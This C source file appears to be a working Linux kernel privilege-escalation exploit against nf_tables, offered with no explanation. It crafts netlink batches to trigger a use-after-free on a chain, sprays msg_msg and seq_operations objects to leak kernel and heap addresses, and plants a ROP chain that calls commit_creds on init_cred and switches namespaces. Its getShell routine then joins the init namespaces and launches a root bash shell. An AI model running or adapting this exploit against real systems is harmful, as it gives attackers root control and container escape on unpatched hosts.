#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sched.h>
#include <signal.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>

#include "msg_helper.h"
#include "net_helper.h"

#define PAGE_SIZE 0x1000

static int seq;

uint64_t kBase = -1;
uint64_t kmalloc_cg_96;
uint64_t kmalloc_cg_1k;
uint64_t leak;

struct {
  long mtype;
  char mtext[0x1000 - MSGMSG_HEADER_SIZE + 128 - MSG_MSGSEG_SIZE];
} msg_rop;

#define debugMsg(format, ...)                                                  \
  { fprintf(stderr, "[DEBUG] " format, ##__VA_ARGS__); }

#undef debugMsg
#define debugMsg(...) __asm__("nop")

void static inline panic(const char *msg) {
  perror(msg);
  exit(EXIT_FAILURE);
}

void pin_cpu(int cpu) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(cpu, &cpu_set);
  if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0) {
    panic("sched_setaffinity");
  }
}

static int rule_cb(const struct nlmsghdr *nlh, void *data) {
  struct nftnl_rule_list *nlr_list = data;
  struct nftnl_rule *r;

  r = nftnl_rule_alloc();
  if (r == NULL)
    panic("oom");

  if (nftnl_rule_nlmsg_parse(nlh, r) < 0) {
    goto err_free;
  }

  struct nftnl_expr_iter *iter = nftnl_expr_iter_create(r);
  debugMsg("%p\n", iter);
  struct nftnl_expr *e_ = nftnl_expr_iter_next(iter);
  debugMsg("%p\n", e_);
  debugMsg("%s\n", e_->ops->name);
  uint32_t len = -1;

  if (1) {
    // const void *ret_ = *(void **)(e_->data + 8);
    const void *ret_ = nftnl_expr_get(e_, NFTNL_EXPR_IMM_CHAIN, &len);
    leak = *(uint64_t *)ret_;
    debugMsg("%p\n", (void *)leak);
  }

  return MNL_CB_OK;

err_free:

  nftnl_rule_free(r);
  return MNL_CB_OK;
}

int leak1024(const struct nlmsghdr *nlh, void *data) {
  puts("OKE");
  return MNL_CB_OK;
}

void static inline writeFile(const char *path, const char *buf) {
  int fd = open(path, O_WRONLY);
  write(fd, buf, strlen(buf));
  close(fd);
}

void setup() {
  pin_cpu(0);
  char map[128];
  snprintf(map, sizeof(map), "0 %d 1", getuid());

  if (unshare(CLONE_NEWUSER | CLONE_NEWNET) == -1) {
    panic("unshare");
  }

  writeFile("/proc/self/uid_map", map);
  writeFile("/proc/self/setgroups", "deny");
  writeFile("/proc/self/gid_map", map);
}

uint64_t save_stack;

void getShell() {

  __asm__("nop");
  __asm__("nop");
  __asm__("nop");
  __asm__("nop");
  __asm__("nop");
  __asm__("nop");
  __asm__("nop");

  __asm__("mov rsp, qword ptr [rip+save_stack]");
  __asm__("mov rbp, rsp");
  __asm__("add rsp, 0x100");

  if (getuid()) {
    puts("Fail");
    _Exit(0);
  }

  setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
  setns(open("/proc/1/ns/pid", O_RDONLY), 0);
  setns(open("/proc/1/ns/net", O_RDONLY), 0);

  char *argv[] = {"/bin/bash", NULL};
  execvp(argv[0], argv);
}

int main() {

  setup();

  struct mnl_socket *nl, *nl1;
  char buf[MNL_SOCKET_BUFFER_SIZE];
  struct nlmsghdr *nlh;
  uint32_t portid, seq, table_seq, family;
  struct nftnl_table *t;
  struct mnl_nlmsg_batch *batch;
  int ret;

  save_stack = (uint64_t)&nl;

  t = nftnl_table_alloc();
  nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, NFPROTO_IPV4);
  nftnl_table_set_str(t, NFTNL_TABLE_NAME, "oke1");

#define CURRENT_BATCH mnl_nlmsg_batch_current(batch)

  // Start nl message

  batch = mnl_nlmsg_batch_start(buf, sizeof buf);
  nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
  mnl_nlmsg_batch_next(batch);

  // Create table

  table_seq = seq;
  family = nftnl_table_get_u32(t, NFTNL_TABLE_FAMILY);
  nlh = nftnl_nlmsg_build_hdr(CURRENT_BATCH, NFT_MSG_NEWTABLE, family,
                              NLM_F_CREATE | NLM_F_ACK, seq++);
  nftnl_table_nlmsg_build_payload(nlh, t);
  mnl_nlmsg_batch_next(batch);

  // DORMANT the table

  nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE,
                              family, NLM_F_CREATE | NLM_F_ACK, seq++);
  nftnl_table_set_u32(t, NFTNL_TABLE_FLAGS, NFT_TABLE_F_DORMANT);
  nftnl_table_nlmsg_build_payload(nlh, t);
  mnl_nlmsg_batch_next(batch);

  // Add basechain "chain1" -- not registered [3]
  struct unft_base_chain_param bp2;
  bp2.hook_num = NF_INET_LOCAL_OUT;
  bp2.prio = 10;

  char *chain1Name = malloc(0x11);
  memset(chain1Name, 'A', 0x11);

  struct nftnl_chain *chain1 = build_chain(chain1Name, "oke1", NULL, 0x1337);
  nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWCHAIN,
                              family, NLM_F_CREATE | NLM_F_ACK, seq++);
  nftnl_chain_nlmsg_build_payload(nlh, chain1);
  mnl_nlmsg_batch_next(batch);

  // Delete chain1
  nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELCHAIN,
                              family, NLM_F_CREATE | NLM_F_ACK, seq++);
  nftnl_chain_nlmsg_build_payload(nlh, chain1);
  mnl_nlmsg_batch_next(batch);

  // Create chain2

  struct nftnl_chain *chain2 = build_chain("chain2", "oke1", &bp2, 11);
  nlh = nftnl_nlmsg_build_hdr(CURRENT_BATCH, NFT_MSG_NEWCHAIN, family,
                              NLM_F_CREATE | NLM_F_ACK, seq++);
  nftnl_chain_nlmsg_build_payload(nlh, chain2);
  mnl_nlmsg_batch_next(batch);

  // Create rule point to chain1

  struct nftnl_rule *rule1 = build_rule("oke1", "chain2", family, NULL);
  nlh = nftnl_nlmsg_build_hdr(CURRENT_BATCH, NFT_MSG_NEWRULE, family,
                              NLM_F_CREATE | NLM_F_ACK, seq++);

  struct nftnl_expr *e = nftnl_expr_alloc("immediate");
  nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_DREG, NFT_REG_VERDICT);
  nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_VERDICT, NFT_GOTO);
  nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_CHAIN_ID, 0x1337);
  nftnl_rule_add_expr(rule1, e);

  nftnl_rule_nlmsg_build_payload(nlh, rule1);
  mnl_nlmsg_batch_next(batch);

  // end batch
  nftnl_batch_end(CURRENT_BATCH, seq++);
  mnl_nlmsg_batch_next(batch);
  //

  nl = mnl_socket_open(NETLINK_NETFILTER);
  if (nl == NULL) {
    perror("mnl_socket_open");
    exit(EXIT_FAILURE);
  }

  if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
    perror("mnl_socket_bind");
    exit(EXIT_FAILURE);
  }
  portid = mnl_socket_get_portid(nl);

  puts("Sending batch 1...");

  if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                        mnl_nlmsg_batch_size(batch)) < 0) {
    perror("mnl_socket_send");
    exit(EXIT_FAILURE);
  }

  mnl_nlmsg_batch_stop(batch);

  usleep(1000);

  //

  batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

  nftnl_batch_begin(CURRENT_BATCH, seq++);
  mnl_nlmsg_batch_next(batch);

  // Del rule1

  nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELRULE,
                              family, NLM_F_CREATE | NLM_F_ACK, seq++);
  nftnl_rule_nlmsg_build_payload(nlh, rule1);
  mnl_nlmsg_batch_next(batch);

  // Make invaild rule
  struct nftnl_rule *rule2 = nftnl_rule_alloc();
  nftnl_rule_set_u32(rule2, NFTNL_RULE_FAMILY, NFPROTO_IPV4);
  nftnl_rule_set_str(rule2, NFTNL_RULE_TABLE, "oke1");
  nftnl_rule_set_str(rule2, NFTNL_RULE_CHAIN, "chain2");

  struct xt_audit_info *audit_info;
  audit_info = malloc(sizeof(struct xt_audit_info));
  audit_info->type = 0xff;
  struct nftnl_expr *e2 = nftnl_expr_alloc("target");
  nftnl_expr_set_str(e2, NFTNL_EXPR_TG_NAME, "AUDIT");
  nftnl_expr_set_u32(e2, NFTNL_EXPR_TG_REV, 0);
  nftnl_expr_set_data(e2, NFTNL_EXPR_TG_INFO, audit_info,
                      sizeof(struct xt_audit_info));
  nftnl_rule_add_expr(rule2, e2);

  nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE,
                              family, NLM_F_CREATE | NLM_F_ACK, seq++);
  nftnl_rule_nlmsg_build_payload(nlh, rule2);
  mnl_nlmsg_batch_next(batch);

  nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
  mnl_nlmsg_batch_next(batch);

  puts("Sending batch 2...");

  if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                        mnl_nlmsg_batch_size(batch)) < 0) {
    perror("mnl_socket_send");
    exit(EXIT_FAILURE);
  }

  mnl_nlmsg_batch_stop(batch);
#define NUM_SEQOPS 32

  int seqops[NUM_SEQOPS];

  printf("[+] Spray seq_operations to fill up kmalloc-cg-32 chain->name\n");
  for (int i = 0; i < NUM_SEQOPS; i++) {
    seqops[i] = open("/proc/self/stat", O_RDONLY);
    if (seqops[i] < 0) {
      perror("[!] open");
      exit(-1);
    }
  }

  struct nftnl_rule *ruleLeak = build_rule("oke1", "chain2", family, NULL);

  int save_seq = seq;

  nlh = nftnl_nlmsg_build_hdr(buf, NFT_MSG_GETRULE, family, NLM_F_DUMP, seq++);
  nftnl_rule_nlmsg_build_payload(nlh, ruleLeak);

  if (mnl_socket_sendto(nl, buf, nlh->nlmsg_len) < 0) {
    panic("mnl_socket_send");
  }

  ret = 1;
  while (save_seq < seq) {
    ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
    ret = mnl_cb_run(buf, ret, save_seq, mnl_socket_get_portid(nl), rule_cb,
                     NULL);
    save_seq += (ret == 0);
  }

  kBase = leak - 0x4ffd10;
  printf("kBase @ 0x%lx\n", kBase);

  nftnl_rule_free(ruleLeak);
  nftnl_rule_free(rule2);
  nftnl_rule_free(rule1);

  for (int i = 0; i < NUM_SEQOPS; i++) {
    if (close(seqops[i]) < 0) {
      perror("close");
      exit(-1);
    }
  }

  sleep(1);

  // Leak heap

  int qids[1024];
  for (int i = 0; i < 1024; i++) {
    if ((qids[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) < 0) {
      panic("msgget");
    }
  }

  struct msgmsg96 msg96 = {.mtype = 0x42};
  for (int i = 0; i < 1024; i++) {
    msgsend96(qids[i], &msg96, 1, 'X');
  }

  batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
  nftnl_batch_begin(CURRENT_BATCH, seq++);
  mnl_nlmsg_batch_next(batch);

  // Create table

  struct nftnl_table *t2 = build_table("oke2", NFPROTO_IPV4);
  family = nftnl_table_get_u32(t2, NFTNL_TABLE_FAMILY);
  nftnl_table_set_u32(t2, NFTNL_TABLE_FLAGS, NFT_TABLE_F_DORMANT);
  nlh = nftnl_nlmsg_build_hdr(CURRENT_BATCH, NFT_MSG_NEWTABLE, family,
                              NLM_F_CREATE | NLM_F_ACK, seq++);
  nftnl_table_nlmsg_build_payload(nlh, t2);
  nftnl_table_free(t2);
  mnl_nlmsg_batch_next(batch);

  // // Create chain 3
  char name3[] = "333333333333333333333333333333333333333333333333333333333333";
  struct nftnl_chain *chain3 = build_chain(name3, "oke2", NULL, 0x1235);
  nlh = nftnl_nlmsg_build_hdr(CURRENT_BATCH, NFT_MSG_NEWCHAIN, family,
                              NLM_F_CREATE | NLM_F_ACK, seq++);
  nftnl_chain_nlmsg_build_payload(nlh, chain3);
  mnl_nlmsg_batch_next(batch);

  struct unft_base_chain_param bp4;
  bp2.hook_num = NF_INET_LOCAL_OUT;
  bp2.prio = 11;

  struct nftnl_chain *chain4 = build_chain("chain4", "oke2", &bp4, 14);
  nlh = nftnl_nlmsg_build_hdr(CURRENT_BATCH, NFT_MSG_NEWCHAIN, family,
                              NLM_F_CREATE | NLM_F_ACK, seq++);
  nftnl_chain_nlmsg_build_payload(nlh, chain4);
  mnl_nlmsg_batch_next(batch);

  struct nftnl_rule *r3 = build_rule("oke2", "chain4", family, NULL);
  struct nftnl_expr *e3 = nftnl_expr_alloc("immediate");
  nftnl_expr_set_u32(e3, NFTNL_EXPR_IMM_DREG, NFT_REG_VERDICT);
  nftnl_expr_set_u32(e3, NFTNL_EXPR_IMM_VERDICT, NFT_GOTO);
  nftnl_expr_set_u32(e3, NFTNL_EXPR_IMM_CHAIN_ID, 0x1235);
  nftnl_rule_add_expr(r3, e3);

  nlh = nftnl_nlmsg_build_hdr(CURRENT_BATCH, NFT_MSG_NEWRULE, family,
                              NLM_F_CREATE | NLM_F_ACK, seq++);
  nftnl_rule_nlmsg_build_payload(nlh, r3);
  mnl_nlmsg_batch_next(batch);

  nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELCHAIN,
                              family, NLM_F_CREATE | NLM_F_ACK, seq++);
  nftnl_chain_nlmsg_build_payload(nlh, chain3);
  mnl_nlmsg_batch_next(batch);

  nftnl_batch_end(CURRENT_BATCH, seq++);
  mnl_nlmsg_batch_next(batch);

  puts("Sending batch 3...");

  ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch));
  if (ret == -1) {
    panic("mnl_socket_sendto");
  }
  mnl_nlmsg_batch_stop(batch);

  // Batch 4

  batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
  nftnl_batch_begin(CURRENT_BATCH, seq++);
  mnl_nlmsg_batch_next(batch);

  /// Del rule3

  nlh = nftnl_nlmsg_build_hdr(CURRENT_BATCH, NFT_MSG_DELRULE, family,
                              NLM_F_CREATE | NLM_F_ACK, seq++);
  nftnl_rule_nlmsg_build_payload(nlh, r3);
  mnl_nlmsg_batch_next(batch);

  struct nftnl_rule *rule4 = build_rule("oke2", "chain4", family, NULL);

  audit_info = malloc(sizeof(struct xt_audit_info));
  audit_info->type = 0xff;
  struct nftnl_expr *e4 = nftnl_expr_alloc("target");
  nftnl_expr_set_str(e4, NFTNL_EXPR_TG_NAME, "AUDIT");
  nftnl_expr_set_u32(e4, NFTNL_EXPR_TG_REV, 0);
  nftnl_expr_set_data(e4, NFTNL_EXPR_TG_INFO, audit_info,
                      sizeof(struct xt_audit_info));
  nftnl_rule_add_expr(rule4, e3);

  nlh = nftnl_nlmsg_build_hdr(CURRENT_BATCH, NFT_MSG_NEWRULE, family,
                              NLM_F_CREATE | NLM_F_ACK, seq++);
  nftnl_rule_nlmsg_build_payload(nlh, rule4);
  mnl_nlmsg_batch_next(batch);

  nftnl_batch_end(CURRENT_BATCH, seq++);
  mnl_nlmsg_batch_next(batch);

  puts("Sending batch 4...");

  ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch));
  if (ret == -1) {
    panic("mnl_socket_sendto");
  }
  mnl_nlmsg_batch_stop(batch);

  struct msgmsg64 msg64 = {.mtype = 0x69};
  struct msgmsg1024 msg1024 = {.mtype = 0x4242};
  for (uint i = 0; i < 1024; ++i) {
    msgsend64(qids[i], &msg64, 1, 'x');
  }

  for (uint i = 0; i < 1024; ++i) {
    msgsend96(qids[i], &msg96, 1, 'Y');
  }

  for (uint i = 0; i < 1024; ++i) {
    msgsend1024(qids[i], &msg1024, 1, 'Y');
  }

  nl1 = mnl_socket_open(NETLINK_NETFILTER);
  if (nl1 == NULL) {
    perror("mnl_socket_open");
    exit(EXIT_FAILURE);
  }

  if (mnl_socket_bind(nl1, 0, MNL_SOCKET_AUTOPID) < 0) {
    perror("mnl_socket_bind");
    exit(EXIT_FAILURE);
  }
  uint portid1 = mnl_socket_get_portid(nl1);

  ruleLeak = build_rule("oke2", "chain4", family, NULL);
  save_seq = seq;
  nftnl_nlmsg_build_hdr(buf, NFT_MSG_GETRULE, family, NLM_F_DUMP, seq++);
  nftnl_rule_nlmsg_build_payload(nlh, ruleLeak);

  if (mnl_socket_sendto(nl1, buf, nlh->nlmsg_len) < 0) {
    panic("mnl_socket_send");
  }

  while (save_seq < seq) {
    ret = mnl_socket_recvfrom(nl1, buf, sizeof(buf));
    ret = mnl_cb_run(buf, ret, save_seq, portid1, rule_cb, NULL);
    save_seq += (ret == 0);
  }

  kmalloc_cg_96 = leak;

  struct msgmsg128 msg128 = {.mtype = 1};
  *(uint64_t *)&msg128
       .mtext[offsetof(struct nft_chain, name) - sizeof(struct msg_msg)] =
      kmalloc_cg_96 + 1;
  for (uint i = 0; i < 1024; ++i) {
    msgsend128(qids[i], &msg128, 1, 0);
  }

  ruleLeak = build_rule("oke2", "chain4", family, NULL);
  save_seq = seq;
  nftnl_nlmsg_build_hdr(buf, NFT_MSG_GETRULE, family, NLM_F_DUMP, seq++);
  nftnl_rule_nlmsg_build_payload(nlh, ruleLeak);

  if (mnl_socket_sendto(nl1, buf, nlh->nlmsg_len) < 0) {
    panic("mnl_socket_send");
  }

  while (save_seq < seq) {
    ret = mnl_socket_recvfrom(nl1, buf, sizeof(buf));
    ret = mnl_cb_run(buf, ret, save_seq, portid1, rule_cb, NULL);
    save_seq += (ret == 0);
  }

  kmalloc_cg_1k = (leak & 0x00ffffffffffffffULL) << 8;

  printf("kmalloc_cg_96: 0x%lx\n", kmalloc_cg_96);
  printf("kmalloc_cg_1k: 0x%lx\n", kmalloc_cg_1k);

  // ROP

  // Free the kmalloc-cg-1024 msg_msg
  puts("Free kmalloc-cg-1k msg_msg spray");
  for (int i = 0; i < 1024; i++) {
    if (msgrcv(qids[i], &msg1024, sizeof(msg1024) - sizeof(long), msg1024.mtype,
               0) < 0) {
      panic("msgrcv");
    }
  }

  memset(&msg1024, 0, sizeof(msg1024));
  uint64_t fake_rule_addr = kmalloc_cg_1k + 0x230;
  uint64_t fake_expr_ops_addr = kmalloc_cg_1k + 0x260;

  msg1024.mtype = 'por';

  struct nft_rule *fakeRule =
      (void *)&msg1024.mtext[0x230 - sizeof(struct msg_msg)];
  //*(uint8_t *)(fakeRule->data - 3) = 0x10;
  fakeRule->dlen = 1;

  struct nft_expr *fakeExpr = (struct nft_expr *)&fakeRule->data[0];
  fakeExpr->ops = (struct nft_expr_ops *)fake_expr_ops_addr;

  struct nft_expr_ops *fakeOps =
      (void *)&msg1024.mtext[0x260 - sizeof(struct msg_msg)];
  fakeOps->validate = (void *)(kBase + 0x1998e); // mov rsp, rax ; ret
  fakeOps->size = 0x10;

  uint64_t *rop1 = (uint64_t *)fakeOps;
  rop1[0] = kBase + 0x1f76fd; // add rsp, 0x48  ; ret ; -> go to fakeOps+0x80

  uint64_t *rop2 = (uint64_t *)&fakeOps->reduce;
  *(rop2++) = kBase + 0x14f87ba; // pop rdi ; ret
  *(rop2++) = kBase + 0x2c6dde0; // init_cred
  *(rop2++) = kBase + 0x214e60;  // commit_creds

  *(rop2++) = kBase + 0x14f87ba; // pop rdi ; ret
  *(rop2++) = 1;
  *(rop2++) = kBase + 0x207e40; // find_task_by_vpid

  *(rop2++) = kBase + 0x28f457; //  mov rdx, rax ; mov rax, rdx ; pop rbx ; ret
  *(rop2++) = 0;
  *(rop2++) =
      kBase + 0x4f2b0e; // mov rdi, rdx ; xor edx, edx ; div esi ; mov eax, edx
                        // ; mov rdx, rdi ; sub rdx, rax ; mov rax, rcx ; ret

  *(rop2++) = kBase + 0x14f9a55; // pop rsi ; ret
  *(rop2++) = kBase + 0x2c6d7e0; // init_proxy

  *(rop2++) = kBase + 0x2127b0; // switch_task_namespaces

  *(rop2++) = kBase + 0x10a8633; // pop rcx ; ret
  *(rop2++) = (uint64_t)getShell + 8;
  *(rop2++) = kBase + 0x31a1a2; // pop r11 ; ret
  *(rop2++) = 0x202;
  *(rop2++) = kBase + 0x1600141; // syscall_return_via_sysret+49

  for (int i = 0; i < 1024; i++) {
    msgsend1024(qids[i], &msg1024, 1, 0);
  }

  // Free msg_msg of size 128
  printf("[+] Free fake chain msg_msg spray\n");
  for (int i = 0; i < 1024; i++) {
    if (msgrcv(qids[i], &msg128, sizeof(msg128) - sizeof(long), msg128.mtype,
               0) < 0) {
      panic("[!] Free msg_msg-128 failed");
    }
  }
  printf("[+] Spray fake chain for ROP\n");
  for (int i = 0; i < 1024; i++) {
    memset(&msg_rop, 0, sizeof(msg_rop));
    *(long *)&msg_rop.mtype = 0x43;
    *(long *)&msg_rop
         .mtext[PAGE_SIZE - sizeof(struct msg_msg) +
                offsetof(struct nft_chain, rules) - sizeof(struct msg_msgseg)] =
        fake_rule_addr;
    if (msgsnd(qids[i], &msg_rop, sizeof(msg_rop) - sizeof(long), 0) < 0) {
      perror("[!] msg_msg spray failed");
      exit(-1);
    }
  }

  struct nftnl_rule *rop_rule = build_rule("oke1", "chain2", family, NULL);
  struct nftnl_expr *rop_expr = nftnl_expr_alloc("immediate");
  nftnl_expr_set_u32(rop_expr, NFTNL_EXPR_IMM_DREG, NFT_REG_VERDICT);
  nftnl_expr_set_u32(rop_expr, NFTNL_EXPR_IMM_VERDICT, NFT_RETURN);
  nftnl_rule_add_expr(rop_rule, rop_expr);

  memset(buf, 0, sizeof buf);
  batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
  nftnl_batch_begin(CURRENT_BATCH, seq++);
  mnl_nlmsg_batch_next(batch);

  nlh = nftnl_nlmsg_build_hdr(CURRENT_BATCH, NFT_MSG_NEWRULE, family,
                              NLM_F_CREATE | NLM_F_ACK, seq++);
  nftnl_rule_nlmsg_build_payload(nlh, rop_rule);
  mnl_nlmsg_batch_next(batch);

  nftnl_batch_end(CURRENT_BATCH, seq++);
  mnl_nlmsg_batch_next(batch);

  ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch));

  printf("ret = %d\n", ret);

  mnl_nlmsg_batch_stop(batch);
  mnl_socket_close(nl);

  return 0;
}